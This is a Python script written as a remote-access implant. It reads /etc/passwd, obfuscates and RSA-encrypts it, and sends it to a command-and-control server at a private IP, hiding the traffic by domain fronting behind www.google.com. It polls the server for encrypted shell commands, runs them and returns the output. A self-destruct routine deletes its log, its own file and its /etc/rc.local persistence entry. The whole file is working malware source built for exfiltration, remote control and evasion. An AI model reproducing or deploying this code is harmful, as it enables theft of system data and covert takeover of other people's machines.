#!/usr/bin/env python3
import time
import requests
import base64
import subprocess
import os
import sys
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

SERVER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----"""

CLIENT_PRIVATE_KEY_PEM = b"""-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----"""

def obfuscate(text):
    """Obfuscate text by first base64‑encoding it, then splitting into 16‑character chunks,
    padding the last chunk with '@' if needed, and reversing the order of chunks."""
    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    """Reverse the obfuscation: split into 16‑character chunks, reverse order,
    and remove trailing '@' from the final chunk."""
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    return ''.join(chunks)

def rsa_encrypt(public_key_pem, plaintext):
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    ciphertext = public_key.encrypt(
        plaintext.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return ciphertext.hex()

def rsa_decrypt(private_key_pem, ciphertext_hex):
    private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
    ciphertext = bytes.fromhex(ciphertext_hex)
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext.decode()

# --- Domain Fronting Settings ---
FRONT_DOMAIN = "www.google.com"  # TLS SNI for obfuscation
REAL_DOMAIN = "172.19.0.2"         # Actual C2 server IP/domain
UPLOAD_PATH = "/upload"
COMMAND_PATH = "/command"
RESULT_PATH = "/result"

UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
RESULT_URL = f"https://{FRONT_DOMAIN}{RESULT_PATH}"

class SNIAdapter(HTTPAdapter):
    def __init__(self, server_hostname, *args, **kwargs):
        self.server_hostname = server_hostname
        super().__init__(*args, **kwargs)
        
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs['server_hostname'] = self.server_hostname
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)

def self_destruct():
    print("Initiating self-destruct sequence...")
    try:
        # Remove log file if it exists.
        log_file = "/tmp/implant.log"
        if os.path.exists(log_file):
            os.remove(log_file)
        # Remove the implant file (self).
        implant_file = "/tmp/implant.py"
        if os.path.exists(implant_file):
            os.remove(implant_file)
        # Remove the implant's entry from /etc/rc.local.
        rc_local = "/etc/rc.local"
        if os.path.exists(rc_local):
            with open(rc_local, "r") as f:
                lines = f.readlines()
            with open(rc_local, "w") as f:
                for line in lines:
                    if "python3 /tmp/implant.py" not in line:
                        f.write(line)
        print("Self-destruct complete. Exiting.")
    except Exception as e:
        print("Error during self-destruct:", e)
    finally:
        sys.exit(0)

def send_data():
    try:
        with open("/etc/passwd", "r") as file:
            file_data = file.read()
        # Obfuscate then encrypt the data.
        obf_data = obfuscate(file_data)
        encrypted_data = rsa_encrypt(SERVER_PUBLIC_KEY_PEM, obf_data)
        payload = {"data": encrypted_data}
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.post(UPLOAD_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("Data sent successfully")
            return True
        else:
            print("Failed to send data. Status code:", response.status_code)
            return False
    except Exception as e:
        print("Error exfiltrating data:", e)
        return False

def poll_command():
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(COMMAND_URL, headers=headers, verify=False)
        if response.status_code == 200:
            json_data = response.json()
            encrypted_cmd = json_data.get("command", "")
            if encrypted_cmd:
                # Decrypt using the client's private key.
                obf_cmd = rsa_decrypt(CLIENT_PRIVATE_KEY_PEM, encrypted_cmd)
                # Deobfuscate to get the base64-encoded command.
                b64_cmd = deobfuscate(obf_cmd)
                cmd = base64.b64decode(b64_cmd.encode()).decode()
                print("Received command:", cmd)
                return cmd
        else:
            print("Failed to poll command. Status:", response.status_code)
        return None
    except Exception as e:
        print("Error polling command:", e)
        return None

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def send_result(result):
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        payload = {"result": result}
        response = session.post(RESULT_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print("Result sent successfully")
        else:
            print("Failed to send result. Status:", response.status_code)
    except Exception as e:
        print("Error sending result:", e)

def main():
    fail_count = 0
    while True:
        if not send_data():
            fail_count += 1
        else:
            fail_count = 0

        if fail_count >= 60:
            self_destruct()

        cmd = poll_command()
        if cmd:
            if cmd.strip() == "BIG BANG!!":
                self_destruct()
            else:
                print("Executing command:", cmd)
                result = execute_command(cmd)
                print("Command output:", result)
                send_result(result)
        time.sleep(60)

if __name__ == '__main__':
    main()
